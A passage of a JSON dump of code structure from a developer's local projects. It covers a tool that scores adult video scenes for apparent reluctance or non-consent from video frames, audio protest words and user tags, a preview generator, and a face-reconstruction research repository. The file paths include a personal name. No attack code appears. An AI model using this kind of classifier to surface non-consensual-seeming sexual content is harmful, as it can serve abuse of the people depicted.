          "def score_with_learning(self, analysis_result: Dict) -> Dict:\n\"\"\"\nScore content using learned patterns.\n\nReturns both the original score and a learned adjustment.\n\"\"\"",
          "def get_learning_status(self) -> Dict:\n\"\"\"Get current learning status\"\"\"\nreluctant_count = sum(1 for l in self.labels.values() if l == \"reluctant\")\nconsensual_count = sum(1 for l in self.labels.values() if l == \"consensual\")\n\nreturn {\n\"total_vectors\": len(self.vectors),\n\"labeled_scenes\": len(self.labels),\n\"reluctant_labeled\": reluctant_count,\n\"consensual_labeled\": consensual_count,",
          "def import_user_tags(self, user_tags_file: Path = None):\n\"\"\"\nImport user-tagged reluctant scenes from StashGrid export.\nThese become \"ground truth\" labels for learning.\n\"\"\"",
          "def integrate_with_analyzer():\n\"\"\"\nIntegration point for ai_consent_analyzer.py\nCall this after each analysis to feed the learning system.\n\"\"\"",
          "def main():"
        ],
        "class_defs": [
          "class FeatureExtractor:",
          "class ConsentLearningEngine:"
        ],
        "imports": [
          "import os",
          "import json",
          "import numpy as np",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Tuple",
          "from collections import defaultdict",
          "import hashlib",
          "import argparse"
        ],
        "comments": [
          "# Storage paths",
          "# Feature dimensions",
          "# === BODY LANGUAGE FEATURES (12 dimensions) ===",
          "# Core physical scores",
          "# Derived body language features",
          "# Count specific body language indicators",
          "# Body positioning indicators (from text analysis of observations)",
          "# === FACIAL EXPRESSION FEATURES (8 dimensions) ===",
          "# Extract from frame results if available, otherwise use aggregates",
          "# Try to get from physical_interaction (new format)",
          "# Check observations for facial cues",
          "# === AUDIO FEATURES (10 dimensions) ===",
          "# Individual protest word frequencies (normalized)",
          "# Red flag density",
          "# Coercion language indicator",
          "# Transcript content indicator",
          "# === TEMPORAL FEATURES (6 dimensions) ===",
          "# Temporal pattern encoding",
          "# Convert to numpy array",
          "# Normalize to unit length for cosine similarity",
          "# Load feature vectors",
          "# Load model state (centroids, etc.)",
          "# Save feature vectors",
          "# Save model state",
          "# Extract feature vector",
          "# Store",
          "# Trigger model update if we have enough labeled data",
          "# Separate vectors by label",
          "# Compute centroids (average feature vectors)",
          "# Compute feature importance (which features differ most between classes)",
          "# Features with bigger differences are more important",
          "# Normalize to sum to 1",
          "# Also consider variance within each class",
          "# Features with low within-class variance but high between-class difference are best",
          "# Blend with raw difference",
          "# Body (12)",
          "# Facial (8)",
          "# Audio (10)",
          "# Temporal (6)",
          "# Top discriminative features",
          "# Body language differences",
          "# Facial differences",
          "# Audio differences",
          "# Extract features",
          "# If we don't have enough learned data, return original",
          "# Compute weighted distance to each centroid",
          "# Cosine similarity (higher = more similar)",
          "# Convert similarities to score adjustment",
          "# If more similar to reluctant, increase score; if more similar to consensual, decrease",
          "# Scale adjustment (max +/- 20 points)",
          "# Generate insights",
          "# Find most similar labeled scene",
          "# Trigger model update",
          "# CLI interface"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 3,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/StashGrid/scripts/ai_consent_analyzer.py",
        "docstrings": [],
        "function_defs": [
          "def log(msg: str, level: str = \"INFO\"):",
          "def __init__(self):",
          "def query(self, q: str, variables: dict = None) -> dict:",
          "def get_scene(self, scene_id: str) -> Optional[dict]:\nresult = self.query(\"\"\"\nquery($id: ID!) {\nfindScene(id: $id) {\nid\ntitle\ndetails\nfiles { path duration }\ntags { id name }\nstudio { id name }",
          "def get_scenes_without_analysis(self, limit: int = 50) -> List[dict]:\n\"\"\"Get scenes that haven't been analyzed yet\"\"\"\nresult = self.query(\"\"\"",
          "def load_cache() -> dict:",
          "def save_cache(cache: dict):",
          "def load_user_tags() -> dict:\n\"\"\"Load user-tagged reluctant content\"\"\"\nif USER_TAGS_FILE.exists():\ntry:\nwith open(USER_TAGS_FILE) as f:\nreturn json.load(f)\nexcept:\npass\nreturn {\"user_tagged_reluctant\": [], \"timestamps\": {}}\n",
          "def load_learned_patterns() -> dict:\n\"\"\"Load patterns learned from user feedback\"\"\"\nif LEARNED_PATTERNS_FILE.exists():\ntry:\nwith open(LEARNED_PATTERNS_FILE) as f:\nreturn json.load(f)\nexcept:\npass\nreturn {\n\"tag_weights\": {},  # tag -> weight adjustment",
          "def save_learned_patterns(patterns: dict):",
          "def extract_frames(video_path: str, count: int = 15) -> List[Tuple[str, float]]:\n\"\"\"Extract sample frames with timestamps\"\"\"\nif not os.path.exists(video_path):\nlog(f\"Video not found: {video_path}\", \"ERROR\")\nreturn []\n\n# Get duration\ntry:\nresult = subprocess.run([\n\"ffprobe\", \"-v\", \"error\",",
          "def encode_image_base64(image_path: str) -> str:",
          "def analyze_frame_visual(image_path: str, timestamp: float, duration: float) -> Dict:\n\"\"\"\nEXHAUSTIVE visual analysis focusing on physical interactions\n\"\"\"",
          "def placeholder_visual_analysis() -> Dict:",
          "def extract_audio(video_path: str, duration: float) -> Optional[str]:\n\"\"\"Extract audio samples from video for analysis\"\"\"\nif not os.path.exists(video_path):\nreturn None\n\ntemp_audio = tempfile.mktemp(suffix=\".wav\", prefix=\"consent_audio_\")\n\n# Extract audio from strategic points (beginning, middle, end)\ntry:\n# Get first 30s, middle 30s, last 30s",
          "def analyze_audio(audio_path: str) -> Dict:\n\"\"\"\nAnalyze audio for REPEATED verbal protests\nKey: Someone saying \"no\", \"stop\", \"please stop\" REPEATEDLY is a major red flag\n\"\"\"",
          "def analyze_context(scene: dict, learned_patterns: dict) -> Dict:\n\"\"\"\nAnalyze scene metadata for contextual reluctance indicators\n\"\"\"",
          "def analyze_temporal(frame_results: List[Dict], duration: float) -> Dict:\n\"\"\"\nAnalyze how reluctance indicators change over time\n\"\"\"",
          "def avg_score(frames):",
          "def analyze_scene_comprehensive(scene: dict, skip_audio: bool = False) -> Dict:\n\"\"\"\nFull multi-modal analysis of a scene\n\"\"\"",
          "def learn_from_user_tags():\n\"\"\"\nLearn patterns from user-tagged reluctant content\n\"\"\"",
          "def run_single(scene_id: str, skip_audio: bool = False):\n\"\"\"Analyze a single scene\"\"\"\napi = StashAPI()\nscene = api.get_scene(scene_id)\n\nif not scene:\nlog(f\"Scene {scene_id} not found\", \"ERROR\")\nreturn\n\nresult = analyze_scene_comprehensive(scene, skip_audio=skip_audio)",
          "def run_batch(limit: int = 50, skip_audio: bool = False):\n\"\"\"Analyze batch of scenes\"\"\"\napi = StashAPI()\ncache = load_cache()\n\nlog(\"=\" * 60)\nlog(\"AI CONSENT ANALYZER - BATCH MODE v2.0\")\nlog(f\"Already analyzed: {len(cache.get('analyzed', {}))} scenes\")\nlog(\"=\" * 60)\n",
          "def show_status():\n\"\"\"Show analysis status\"\"\"\ncache = load_cache()\nanalyzed = cache.get(\"analyzed\", {})\nlearned = load_learned_patterns()\n\nprint(\"=\" * 60)\nprint(\"AI CONSENT ANALYZER STATUS\")\nprint(\"=\" * 60)\nprint(f\"Version: {cache.get('version', '1.0')}\")",
          "def export_for_stashgrid():\n\"\"\"Export results for StashGrid app\"\"\"\ncache = load_cache()\nanalyzed = cache.get(\"analyzed\", {})\n\nexport = {\n\"version\": \"2.1\",\n\"generated_at\": datetime.now().isoformat(),\n\"scenes\": {}\n}",
          "def main():"
        ],
        "class_defs": [
          "class StashAPI:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import subprocess",
          "import tempfile",
          "import base64",
          "import requests",
          "import re",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Optional, List, Dict, Tuple",
          "from collections import defaultdict",
          "import hashlib",
          "import whisper",
          "import argparse"
        ],
        "comments": [
          "# Configuration",
          "# Analysis settings",
          "# Score thresholds (0-100)",
          "# Keyword patterns for contextual analysis",
          "# Coercion themes",
          "# Power dynamics",
          "# Scenarios",
          "# Physical",
          "# Cache files",
          "# Filter out already analyzed",
          "# ============================================================================",
          "# VISUAL ANALYSIS",
          "# ============================================================================",
          "# Get duration",
          "# Strategic sampling: more frames at beginning and end where reluctance often shows",
          "# First 10% (often shows initial reluctance)",
          "# Middle section",
          "# Last 20% (compliance or continued resistance)",
          "# Parse JSON",
          "# ============================================================================",
          "# AUDIO ANALYSIS",
          "# ============================================================================",
          "# Extract audio from strategic points (beginning, middle, end)",
          "# Get first 30s, middle 30s, last 30s",
          "# Concatenate segments",
          "# Cleanup",
          "# Try to use whisper for transcription",
          "# === COUNT REPEATED PROTESTS (THE KEY INDICATOR) ===",
          "# Count actual occurrences, not just presence",
          "# REPEATED protests are the key indicator",
          "# 1-2 times could be anything, 3+ is concerning, 5+ is very concerning",
          "# Specific concerning phrases",
          "# Coercion language (the other party)",
          "# Calculate overall verbal protest score",
          "# Get transcript excerpts around protest words",
          "# Overall audio score - heavily weighted toward repeated protests",
          "# Add specific red flag summary",
          "# Cleanup",
          "# ============================================================================",
          "# CONTEXTUAL ANALYSIS",
          "# ============================================================================",
          "# Tag analysis",
          "# Title analysis",
          "# Description analysis",
          "# Marker analysis (chapter titles)",
          "# Apply learned patterns",
          "# Cap learned boost",
          "# Overall context score",
          "# ============================================================================",
          "# TEMPORAL ANALYSIS",
          "# ============================================================================",
          "# Group frames by position",
          "# Identify patterns",
          "# Find peak moment",
          "# ============================================================================",
          "# MAIN ANALYSIS ENGINE",
          "# ============================================================================",
          "# 1. CONTEXTUAL ANALYSIS (fast, no API needed)",
          "# 2. VISUAL ANALYSIS",
          "# Cleanup",
          "# 3. AUDIO ANALYSIS",
          "# 4. TEMPORAL ANALYSIS",
          "# AGGREGATE SCORES",
          "# Visual aggregate - focus on physical interaction indicators",
          "# Collect all physical observations",
          "# Calculate sub-scores",
          "# Calculate weighted overall score",
          "# Visual analysis is most important for physical interaction study",
          "# Boost for high max scores (catches brief but clear moments of distress)",
          "# Boost for repeated audio protests (very clear indicator)",
          "# Determine category",
          "# Build comprehensive result",
          "# Overall scores",
          "# PHYSICAL INTERACTION ANALYSIS (detailed)",
          "# AUDIO ANALYSIS (protest detection)",
          "# Context",
          "# Temporal pattern",
          "# ============================================================================",
          "# LEARNING SYSTEM",
          "# ============================================================================",
          "# Count tags",
          "# Count studios",
          "# Count performers",
          "# Extract title words",
          "# Calculate weights (more occurrences = stronger association)",
          "# Tag weights",
          "# Studio weights",
          "# Performer patterns (careful - presence doesn't mean they're always in reluctant content)",
          "# Title patterns (words that appear frequently in reluctant content)",
          "# ============================================================================",
          "# CLI COMMANDS",
          "# ============================================================================",
          "# Save to cache",
          "# Print detailed result",
          "# Physical Interaction Analysis (the main focus)",
          "# Audio Analysis",
          "# High reluctance scenes",
          "# Physical interaction details",
          "# Audio details"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 13,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/StashGrid/scripts/segment_preview_generator.py",
        "docstrings": [],
        "function_defs": [
          "def get_video_duration(video_path: str) -> float:\n\"\"\"Get video duration in seconds using ffprobe\"\"\"\ntry:\nresult = subprocess.run([\n\"ffprobe\", \"-v\", \"quiet\",\n\"-show_entries\", \"format=duration\",\n\"-of\", \"json\",\nvideo_path\n], capture_output=True, text=True, timeout=30)\n",
          "def generate_master_preview(video_path: str, output_path: str, duration: float) -> bool:\n\"\"\"Generate a full-video master preview as animated WebP\"\"\"\ntry:\n# Calculate time-lapse factor to fit video into reasonable size\n# Aim for ~30 seconds of preview for any length video\ntarget_duration = min(30, duration)\nspeed_factor = duration / target_duration if duration > 30 else 1\n\n# Use select filter to pick frames at intervals\nframe_interval = max(1, int(speed_factor))",
          "def generate_segment_preview(video_path: str, output_path: str,",
          "def generate_all_segments(video_path: str, output_dir: Path,",
          "def process_video(video_path: str, scene_id: str) -> dict:\n\"\"\"Process a single video - generate master and all segments\"\"\"\nprint(f\"\\nProcessing: {scene_id}\")\nprint(f\"  Source: {video_path}\")\n\n# Create output directory\noutput_dir = OUTPUT_DIR / scene_id\noutput_dir.mkdir(parents=True, exist_ok=True)\n\n# Get video duration",
          "def get_stash_scenes(limit: int = 100) -> list:\n\"\"\"Fetch scenes from Stash API\"\"\"\nimport requests\n\nheaders = {\"Content-Type\": \"application/json\"}\nif STASH_API_KEY:\nheaders[\"ApiKey\"] = STASH_API_KEY\n\nquery = \"\"\"",
          "def process_stash_library(limit: int = 10):\n\"\"\"Process scenes from Stash library\"\"\"\nprint(\"=\" * 60)\nprint(\"SEGMENT PREVIEW GENERATOR\")\nprint(\"=\" * 60)\nprint(f\"Output: {OUTPUT_DIR}\")\nprint(f\"Segments per video: {SEGMENT_COUNT}\")\nprint(f\"Segment duration: {SEGMENT_DURATION}s\")\nprint()\n",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import subprocess",
          "import tempfile",
          "import argparse",
          "from pathlib import Path",
          "from concurrent.futures import ThreadPoolExecutor, as_completed",
          "from datetime import datetime",
          "import requests"
        ],
        "comments": [
          "# Configuration",
          "# Preview settings",
          "# Calculate time-lapse factor to fit video into reasonable size",
          "# Aim for ~30 seconds of preview for any length video",
          "# Use select filter to pick frames at intervals",
          "# Calculate segment positions",
          "# Skip first and last 5% to avoid intros/credits",
          "# Generate segments in parallel",
          "# Sort by index",
          "# Create output directory",
          "# Get video duration",
          "# Generate master preview",
          "# Generate segment previews",
          "# Write manifest",
          "# Check if already processed",
          "# Summary"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/character-pipeline/MICA",
    "name": "MICA",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/test.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import torch",
          "import torch.backends.cudnn as cudnn",
          "import torch.multiprocessing as mp",
          "from jobs import test",
          "from configs.config import parse_args"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/jobs.py",
        "docstrings": [],
        "function_defs": [
          "def setup(rank, world_size, port):",
          "def deterministic(rank):",
          "def test(rank, world_size, cfg, args):",
          "def train(rank, world_size, cfg):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import random",
          "import sys",
          "import numpy as np",
          "import torch",
          "import torch.backends.cudnn as cudnn",
          "import torch.distributed as dist",
          "import yaml",
          "from loguru import logger",
          "from micalib.tester import Tester",
          "from micalib.trainer import Trainer",
          "from utils import util"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# shutil.copy(cfg.cfg_file, os.path.join(cfg.output_dir, 'config.yaml'))"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/render_dataset.py",
        "docstrings": [],
        "function_defs": [
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import random",
          "from glob import glob",
          "from pathlib import Path",
          "import cv2",
          "import numpy as np",
          "import torch",
          "import trimesh",
          "from tqdm import tqdm",
          "from configs.config import get_cfg_defaults",
          "from micalib.renderer import MeshShapeRenderer",
          "from models.flame import FLAME"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/train.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import torch",
          "import torch.backends.cudnn as cudnn",
          "import torch.multiprocessing as mp",
          "from jobs import train",
          "from configs.config import parse_args"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/demo.py",
        "docstrings": [],
        "function_defs": [
          "def deterministic(rank):",
          "def process(args, app, image_size=224, draw_bbox=False):",
          "def to_batch(path):",
          "def load_checkpoint(args, mica):",
          "def main(cfg, args):"
        ],
        "class_defs": [],
        "imports": [
          "import argparse",
          "import os",
          "import random",
          "from glob import glob",
          "from pathlib import Path",
          "import cv2",
          "import numpy as np",
          "import torch",
          "import torch.backends.cudnn as cudnn",
          "import trimesh",
          "from insightface.app.common import Face",
          "from insightface.utils import face_align",
          "from loguru import logger",
          "from skimage.io import imread",
          "from tqdm import tqdm",
          "from configs.config import get_cfg_defaults",
          "from datasets.creation.util import get_arcface_input, get_center, draw_on",
          "from utils import util",
          "from utils.landmark_detector import LandmarksDetector, detectors"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/validator.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, trainer):",
          "def prepare_data(self):",
          "def state_dict(self):",
          "def load_state_dict(self, dict):",
          "def update_embeddings(self, actors, arcface):",
          "def run(self):",
          "def now(self):"
        ],
        "class_defs": [
          "class Validator(object):"
        ],
        "imports": [
          "import os",
          "import subprocess",
          "from copy import deepcopy",
          "from datetime import datetime",
          "import numpy as np",
          "import torch",
          "from loguru import logger",
          "from torch.utils.data import DataLoader",
          "import datasets",
          "from utils import util",
          "from utils.best_model import BestModel"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# Create a separate instance only for predictions",
          "# nfc = util.find_model_using_name(model_dir='nfclib.models', model_name=self.cfg.model.name)(self.cfg, self.device)",
          "# self.tester = Tester(nfc, self.cfg, self.device)",
          "# self.tester.render_mesh = False",
          "# In the case of using multiple GPUs",
          "# Calculate averages",
          "# Save best model",
          "# self.now()",
          "# Print embeddings every nth validation step",
          "# util.save_embedding_projection(embeddings, os.path.join(self.cfg.output_dir, self.cfg.train.val_vis_dir, f'{self.trainer.global_step:08}_embeddings.jpg'))",
          "# Render predicted meshes",
          "# self.tester.test_now('', 'training', self.nfc.model_dict())"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/tester.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nfc_model, config=None, device=None):",
          "def load_checkpoint(self, model_path):",
          "def load_model_dict(self, model_dict):",
          "def process_image(self, img, app):",
          "def process_folder(self, folder, app):",
          "def get_name(self, best_model, id):",
          "def test_now(self, best_model, id=None):",
          "def test_stirling(self, best_model, id=None):",
          "def save_mesh(self, file, vertices):",
          "def cache_to_cuda(self, cache):",
          "def create_now_cache(self):",
          "def create_stirling_cache(self):",
          "def update_embeddings(self, actor, arcface):",
          "def stirling(self, best_id):",
          "def now(self, best_id):"
        ],
        "class_defs": [
          "class Tester(object):"
        ],
        "imports": [
          "import os",
          "from glob import glob",
          "import cv2",
          "import numpy as np",
          "import torch",
          "import torch.distributed as dist",
          "from insightface.app import FaceAnalysis",
          "from insightface.app.common import Face",
          "from insightface.utils import face_align",
          "from loguru import logger",
          "from pytorch3d.io import save_ply",
          "from skimage.io import imread",
          "from skimage.transform import estimate_transform, warp",
          "from tqdm import tqdm",
          "from configs.config import cfg",
          "from utils import util"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# deca model",
          "### NOW CROPPING",
          "# scale = np.random.rand() * (1.8 - 1.1) + 1.1",
          "# crop image",
          "# mask = self.nfc.masking.get_triangle_whole_mask()",
          "# v, f = self.nfc.masking.get_masked_mesh(vertices, mask)",
          "# save_obj(file, v[0], f[0])",
          "# util.save_embedding_projection(self.embeddings_lyhm, f'{self.cfg.output_dir}/stirling_test_{best_id}/stirling_{quality}_arcface_embeds.pdf')",
          "# for actor in tqdm(sorted(os.listdir(NOW_SCANS))): # only 20",
          "# 'deca': deca,",
          "# util.save_embedding_projection(self.embeddings_lyhm, f'{self.cfg.output_dir}/now_test_{best_id}/now_arcface_embeds.pdf')"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/renderer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, obj_filename):",
          "def render_mesh(self, vertices, faces=None, verts_rgb=None):"
        ],
        "class_defs": [
          "class MeshShapeRenderer(nn.Module):"
        ],
        "imports": [
          "import pytorch3d",
          "import torch",
          "import torch.nn as nn",
          "from pytorch3d.io import load_obj",
          "from pytorch3d.renderer import ("
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/base_model.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config=None, device=None, tag=''):",
          "def initialize(self):",
          "def create_flame(self, model_cfg):",
          "def create_model(self):",
          "def create_load(self):",
          "def model_dict(self):",
          "def parameters_to_optimize(self):",
          "def encode(self, images, arcface_images):",
          "def decode(self, codedict, epoch):",
          "def compute_losses(self, input, encoder_output, decoder_output):",
          "def compute_masks(self, input, decoder_output):",
          "def setup_renderer(self, model_cfg):",
          "def create_weights(self):",
          "def create_template(self, B):"
        ],
        "class_defs": [
          "class BaseModel(nn.Module):"
        ],
        "imports": [
          "from abc import abstractmethod",
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "from configs.config import cfg",
          "from models.flame import FLAME",
          "from utils.masking import Masking"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod",
          "@abstractmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/micalib/trainer.py",
        "docstrings": [],
        "function_defs": [
          "def print_info(rank):",
          "def seed_worker(worker_id):",
          "def __init__(self, nfc_model, config=None, device=None):",
          "def configure_optimizers(self):",
          "def load_checkpoint(self):",
          "def save_checkpoint(self, filename):",
          "def training_step(self, batch):",
          "def validation_step(self):",
          "def evaluation_step(self):",
          "def prepare_data(self):",
          "def fit(self):"
        ],
        "class_defs": [
          "class Trainer(object):"
        ],
        "imports": [
          "import os",
          "import random",
          "import sys",
          "from datetime import datetime",
          "import numpy as np",
          "import torch",
          "import torch.distributed as dist",
          "from loguru import logger",
          "from torch.utils.data import DataLoader",
          "from tqdm import tqdm",
          "import datasets",
          "from configs.config import cfg",
          "from utils import util",
          "from validator import Validator",
          "from torch.utils.tensorboard import SummaryWriter"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92023 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: mica@tue.mpg.de",
          "# deca model",
          "# reset optimizer if loaded from pretrained model",
          "# add images to tensorboard"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/MICA/datasets/__init__.py",
        "docstrings": [],
